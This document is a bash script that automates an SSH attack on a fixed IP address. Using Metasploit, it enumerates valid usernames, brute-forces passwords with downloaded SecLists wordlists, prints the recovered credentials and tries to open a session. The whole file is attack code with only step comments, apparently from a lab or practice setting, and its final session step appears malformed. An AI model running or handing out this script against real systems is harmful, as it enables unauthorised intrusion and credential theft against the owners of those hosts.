#!/bin/bash

# === Download SecLists ===
curl --silent --output seclist_usernames.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Usernames/Names/names.txt

curl --silent --output seclist_passwords.txt \
  https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/100k-most-used-passwords-N.txt

TARGET="172.16.17.3"
USERLIST="seclist_usernames.txt"
PASSLIST="seclist_passwords.txt"

echo "[*] Step 1: SSH Username Enumeration..."

#############################################
# 1) Create RC file for username enumeration
#############################################

cat > ssh_enum.rc <<EOF
use auxiliary/scanner/ssh/ssh_enumusers
set RHOSTS $TARGET
set USER_FILE $USERLIST
run
exit
EOF

#############################################
# 2) Run enumeration
#############################################

msfconsole -q -r ssh_enum.rc > enum_output.txt

echo "[*] Parsing valid usernames..."
grep "\[+\]" enum_output.txt | sed -E "s/.*User '([^']+)'.*/\1/" > valid_users.txt

if [ ! -s valid_users.txt ]; then
    echo "[-] No valid SSH usernames found."
    exit 1
fi

echo "[+] Valid SSH usernames found:"
sed 's/^/    - /' valid_users.txt

#############################################
# 3) Create RC file for brute forcing
#############################################

echo "[*] Step 2: Password brute-forcing..."

cat > ssh_bruteforce.rc <<EOF
use auxiliary/scanner/ssh/ssh_login
set RHOSTS $TARGET
set USER_FILE valid_users.txt
set PASS_FILE $PASSLIST
set STOP_ON_SUCCESS true
run
exit
EOF

#############################################
# 4) Run brute force
#############################################

msfconsole -q -r ssh_bruteforce.rc > brute_output.txt

echo "[*] Parsing brute-force results..."

SUCCESS_LINE=$(grep "Login Successful" brute_output.txt | head -n 1)

if [ -z "$SUCCESS_LINE" ]; then
    echo "[-] No valid SSH credentials found."
    exit 1
fi

USER=$(echo "$SUCCESS_LINE" | sed -E "s/.*Login Successful: ([^:]+):.*/\1/")
PASS=$(echo "$SUCCESS_LINE" | sed -E "s/.*Login Successful: [^:]+:(.*)/\1/")

echo "[+] SSH credentials discovered:"
echo "    USER='$USER'"
echo "    PASS='$PASS'"

#############################################
# 5) Create RC file for automatic SSH session
#############################################

echo "[*] Step 3: Creating SSH session RC..."

cat > ssh_login.rc <<EOF
setg RHOSTS $TARGET
setg USERNAME $USER
setg PASSWORD $PASS
ssh -v
exit
EOF

#############################################
# 6) Execute SSH session RC file
#############################################

echo "[*] Opening SSH session..."
msfconsole -q -r ssh_login.rc

echo "[+] SSH session completed."
